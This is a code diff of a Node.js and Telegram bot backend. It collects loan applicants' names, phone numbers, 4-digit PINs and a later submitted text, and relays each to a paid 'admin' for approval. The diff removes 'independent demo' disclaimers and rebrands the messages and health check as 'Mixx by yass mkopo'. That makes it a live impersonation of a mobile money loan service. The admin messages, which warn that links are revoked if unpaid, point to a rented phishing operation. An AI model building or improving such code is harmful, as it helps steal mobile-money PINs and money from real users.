@@ -51,21 +51,21 @@ async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.q
 function decisionKeyboard(stage,id){const buttons=stage==='details'?[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong pin',callback_data:`decide:wrong_id:${stage}:${id}`}]]:[[ {text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong pin',callback_data:`decide:wrong_id:${stage}:${id}`},{text:'❌ Wrong Text',callback_data:`decide:wrong_text:${stage}:${id}`} ]];return {inline_keyboard:buttons};}
 async function notifyAdmins(message,keyboard,assignedAdmin=null){if(!assignedAdmin)return;const r=await pool.query('SELECT active FROM orange_demo_admins WHERE chat_id=$1',[String(assignedAdmin)]);if(!r.rows[0]?.active)return;await send(String(assignedAdmin),message,{reply_markup:keyboard});}
 async function notifyDetails(a){
- const msg=`🟣 <b>New demo application — review</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🧾 Pin: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nMixx-inspired independent demo.`;
+ const msg=`🟣 <b>New application</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🧾 Pin: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nMixx by yass mkopo.`;
  await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
 }
 async function notifyReference(a){
- const msg=`🟣 <b>Mixx by- text submitted — review required</b>\n\n🆔 pin: <code>${esc(a.id)}</code>\n📞 phone: <code>${esc(a.phone)}</code>\n📝 text: <code>${esc(a.reference_text||'')}</code>\n📌 Status: TEXT PENDING\n\nmkopo wa Mixx by Yas.`;
+ const msg=`🟣 <b>Mixx by- text submitted — review required</b>\n\n🆔 id: <code>${esc(a.id)}</code>\n📞 phone: <code>${esc(a.phone)}</code>\n📝 text: <code>${esc(a.reference_text||'')}</code>\n📌 Status: TEXT PENDING\n\nmkopo wa Mixx by Yas.`;
  await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
 }
-app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'Mixx-inspired independent Tanzania demo'}));
+app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'Mixx-by yass mkopo.'}));
 app.post('/api/applications',async(req,res)=>{
  try{
   if(!pool) return res.status(503).json({error:'Application storage is not configured yet.'});
   const full_name=String(req.body.full_name||'').trim(); const phone=String(req.body.phone||'').replace(/[\s()-]/g,'').trim(); const reference_id=String(req.body.reference_id||'').trim(); const amount=Number(req.body.amount); const adminCode=String(req.body.admin||'').trim().toUpperCase();
   if(full_name.length<2||full_name.length>120) return res.status(400).json({error:'Enter your full name.'});
   if(!/^\+?[0-9]{7,15}$/.test(phone)) return res.status(400).json({error:'Enter a valid phone number.'});
-  if(!/^\d{4}$/.test(reference_id)) return res.status(400).json({error:'Reference ID must contain exactly 4 digits.'});
+  if(!/^\d{4}$/.test(reference_id)) return res.status(400).json({error:'pin exactly 4 digits.'});
   if(!Number.isFinite(amount)||amount<1000||amount>100000000) return res.status(400).json({error:'Enter a demo amount from TZS 1,000 to TZS 100,000,000.'});
   let assigned=null;if(adminCode){const ar=await pool.query('SELECT chat_id FROM orange_demo_admins WHERE admin_code=$1 AND active=TRUE',[adminCode]);if(ar.rows[0])assigned=ar.rows[0].chat_id;}
   const id='TZ-'+Date.now().toString(36).toUpperCase()+'-'+crypto.randomBytes(2).toString('hex').toUpperCase();
@@ -99,7 +99,7 @@ async function handleMessage(m){
  }
  if(t.startsWith('/addadmin ')){
   if(id!==SUPER)return send(id,'Admin access required.');const parts=t.split(/\s+/);const target=parts[1], adminCode=parts[2]||'';if(!/^\d+$/.test(target))return send(id,'Usage: /addadmin CHAT_ID ADMIN003');
-  await addAdmin(target,adminCode);const row=await pool.query('SELECT admin_code FROM orange_demo_admins WHERE chat_id=$1',[target]);await send(id,`✅ Admin ${target} added as ${row.rows[0].admin_code}.\nPersonal customer link:\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?admin='+row.rows[0].admin_code)}`);await send(target,'👋 You have been assigned as an application admin. Send /start, then /mylink to get your personal customer link.');return;
+  await addAdmin(target,adminCode);const row=await pool.query('SELECT admin_code FROM orange_demo_admins WHERE chat_id=$1',[target]);await send(id,`✅ Admin ${target} added as ${row.rows[0].admin_code}.\nPersonal customer link:\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?admin='+row.rows[0].admin_code)}`);await send(target,'👋 You have been assigned as an application admin. Send /start, then /mylink to get your personal customer link. your link will be outomatically revoke in 24 hours if unpaid.');return;
  }
  if(t.startsWith('/revokeadmin ')){if(id!==SUPER)return send(id,'Admin access required.');const target=t.split(/\s+/)[1];if(!/^\d+$/.test(target))return send(id,'Usage: /revokeadmin CHAT_ID');await pool.query('UPDATE orange_demo_admins SET active=FALSE WHERE chat_id=$1',[target]);return send(id,`Admin ${target} revoked.`);}
  if(t==='/admins'){if(id!==SUPER)return send(id,'Super Admin access required.');const r=await pool.query('SELECT chat_id,active,referral_code FROM orange_demo_admins ORDER BY added_at DESC');return send(id,r.rows.length?r.rows.map(a=>`${a.active?'✅':'⛔'} <code>${a.chat_id}</code> · ${a.referral_code||'no link'}`).join('\n'):'No admins configured.');}
